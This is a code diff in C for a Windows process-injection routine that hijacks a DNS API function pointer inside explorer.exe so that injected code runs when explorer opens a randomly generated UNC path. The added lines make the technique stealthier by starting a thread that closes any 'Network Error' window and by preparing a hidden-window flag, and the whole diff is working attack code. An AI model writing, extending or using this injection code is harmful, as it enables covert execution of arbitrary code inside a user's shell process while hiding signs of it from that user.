@@ -98,7 +98,9 @@ HRESULT ShellExecInExplorer(PCWSTR pszFile) {
     IShellDispatch2 *psd;
     HRESULT         hr;
     BSTR            bstrFile;
-    VARIANT         vtEmpty = {};
+    VARIANT         vtHide, vtEmpty = {};
+    
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     
     bstrFile = SysAllocString(pszFile);
     if(bstrFile == NULL) return E_OUTOFMEMORY;
@@ -107,6 +109,8 @@ HRESULT ShellExecInExplorer(PCWSTR pszFile) {
     if(hr == S_OK) {
       hr = GetShellDispatch(psv, IID_PPV_ARGS(&psd));
       if(hr == S_OK) {
+        V_VT(&vtHide)  = VT_INT;
+        V_INT(&vtHide) = SW_HIDE;
         hr = psd->ShellExecuteW(
           bstrFile, vtEmpty, vtEmpty, vtEmpty, vtEmpty);
         psd->Release();
@@ -197,29 +201,48 @@ LPVOID GetDnsApiAddr(DWORD pid) {
     return va;
 }
 
+// thread to loop until hEvent signalled to end
+// for any windows with "Network Error" in it, closes the window
+VOID SuppressErrors(LPVOID lpParameter) {
+    HWND hw;
+    
+    for(;;) {
+      hw = FindWindowEx(NULL, NULL, NULL, L"Network Error");
+      if(hw != NULL) {
+        PostMessage(hw, WM_CLOSE, 0, 0);
+        break;
+      }
+    }
+}
+
 VOID dns_inject(LPVOID payload, DWORD payloadSize) {
     LPVOID dns, cs, ptr;
-    DWORD  pid, tick, i;
-    HANDLE hp;
+    DWORD  pid, cnt, tick, i, t;
+    HANDLE hp, ht;
     SIZE_T wr;
-    WCHAR  unc[32];
-    
-    // 1. initialize COM and force explorer to load dns api
-    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
-    
-    unc[0] = '\\'; unc[1] = '\\';
-    tick = GetTickCount();
-    for(i=0; i<8; i++) {
-      unc[2+i] = (tick % 26) + 'a';
-      tick >>= 2;
-    }
-    ShellExecInExplorer(unc);
-    
-    // 2. get process id and address of function pointer
+    HWND   hw;
+    WCHAR  unc[32]={L'\\', L'\\'};
+
+    // 1. initialize COM and force explorer to load dns api if required
     GetWindowThreadProcessId(GetShellWindow(), &pid); 
     ptr = GetDnsApiAddr(pid);
+    
+    ht = CreateThread(NULL, 0, 
+      (LPTHREAD_START_ROUTINE)SuppressErrors, NULL, 0, NULL);
+      
+    // if not loaded, try force explorer to load
     if(ptr == NULL) {
-      printf("DNSAPI still not loaded.\n");
+      tick = GetTickCount();
+      for(i=0; i<8; i++) {
+        unc[2+i] = (tick % 26) + 'a';
+        tick >>= 2;
+      }
+      ShellExecInExplorer(unc);
+      ptr = GetDnsApiAddr(pid);
+    }
+    
+    if(ptr == NULL) {
+      printf("DNS API still not loaded.\n");
       return;
     }
     // 2. open explorer, read address of dns function.
@@ -236,16 +259,18 @@ VOID dns_inject(LPVOID payload, DWORD payloadSize) {
     // 4. generate "random" unc path so DNS api called
     tick = GetTickCount();
     for(i=0; i<8; i++) {
-      unc[2+i] = (tick % 26) + 'a';
+      unc[2+i] = (tick % 26) + L'a';
       tick >>= 2;
     }
     
     // 5. trigger execution of payload
     ShellExecInExplorer(unc);
-
+    
     // 6. restore value of pointer
     WriteProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
     
+    TerminateThread(ht, 0);
+
     // 7. Release memory for code
     VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
     CloseHandle(hp);
